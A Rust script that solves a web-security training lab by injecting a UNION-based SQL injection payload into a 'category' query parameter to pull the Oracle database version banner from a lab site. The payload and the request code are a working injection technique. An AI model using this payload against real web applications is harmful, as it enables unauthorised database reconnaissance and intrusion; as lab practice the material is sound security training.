/*******************************************************************************
*
* Lab: SQL injection attack, querying the database type and version on Oracle
*
* Hack Steps: 
*      1. Inject payload into 'category' query parameter
*      2. Observe that the database banner is returned in the response
*
********************************************************************************/
use reqwest::{
    blocking::{Client, ClientBuilder, Response},
    redirect::Policy,
};
use std::{
    io::{self, Write},
    time::Duration,
};
use text_colorizer::Colorize;

// Change this to your lab URL
const LAB_URL: &str = "https://0a8300dd0405849281e7d9ee00df0025.web-security-academy.net";

fn main() {
    println!("⦗#⦘ Injection parameter: {}", "category".yellow());
    print!("❯❯ Injecting payload to retrieve the database banner.. ");
    io::stdout().flush().unwrap();

    let payload = "' UNION SELECT banner, null FROM v$version-- -";
    fetch(&format!("/filter?category={payload}"));

    println!("{}", "OK".green());
    println!("🗹 The lab should be marked now as {}", "solved".green())
}

fn fetch(path: &str) -> Response {
    let client = build_web_client();
    client
        .get(format!("{LAB_URL}{path}"))
        .send()
        .expect(&format!("⦗!⦘ Failed to fetch: {}", path.red()))
}

fn build_web_client() -> Client {
    ClientBuilder::new()
        .redirect(Policy::none())
        .connect_timeout(Duration::from_secs(5))
        .build()
        .unwrap()
}
